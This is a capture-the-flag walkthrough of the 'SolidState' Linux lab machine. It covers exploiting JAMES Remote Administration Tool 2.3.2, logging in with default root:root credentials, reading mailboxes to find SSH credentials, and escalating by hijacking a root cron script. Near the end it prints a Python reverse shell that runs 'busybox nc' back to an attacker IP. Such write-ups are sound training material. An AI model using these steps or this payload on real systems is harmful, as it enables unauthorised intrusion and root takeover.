# SolidState - Walkthrough (Linux)

## 🧱 Initial Foothold

### 1️⃣ Nmap Scan
- Discovered uncommon port **4555** open.
- Connected with netcat:
  ```bash
  nc 10.129.164.204 4555
  ```

### 2️⃣ JAMES Remote Administration Tool 2.3.2
- Identified service: **JAMES Remote Administration Tool v2.3.2**
- Searched exploit:
  ```bash
  searchsploit JAMES Remote Administration Tool 2.3.2
  ```

- Found and used exploit: **50347.py**
  ```bash
  python3 50347.py 10.129.164.204 10.10.16.52 119
  ```

### 3️⃣ Accessing Mailboxes
- Reconnected to port 4555 as `root:root`
- Changed user passwords
- Connected to port **110 (POP3)** using Telnet to read mail:
  ```bash
  telnet 10.129.164.204 110
  ```

- Found credentials for **mindy** in user mailbox
- SSH'ed using `mindy`'s credentials while listener was active on port **119**

---

## ⚙️ Privilege Escalation

### 🔍 1. Enumeration with pspy
- Ran `pspy32s` to monitor root cron jobs
- Observed a scheduled script:
  ```bash
  /opt/tmp.py
  ```

### 🧪 2. Prepping Shell for Editing
- Used `script` to gain nano editing ability in the limited shell:
  ```bash
  script -qc /bin/bash
  # Press Ctrl+Z
  stty raw -echo ; fg
  export TERM=xterm-256color
  ```

### ✏️ 3. Modify the tmp.py Script
- Replaced `/opt/tmp.py` with a reverse shell payload:
  ```python
  #!/usr/bin/env python
  import os
  os.system('busybox nc 10.10.16.52 80 -e bash')
  ```

- Started listener:
  ```bash
  nc -nlvp 80
  ```

- Got root shell once the cron executed the script.

---

## ✅ Summary

- Unusual admin port led to exploit of mail server
- Found credentials via email access
- Escalated privileges by hijacking root cronjob with Python reverse shell
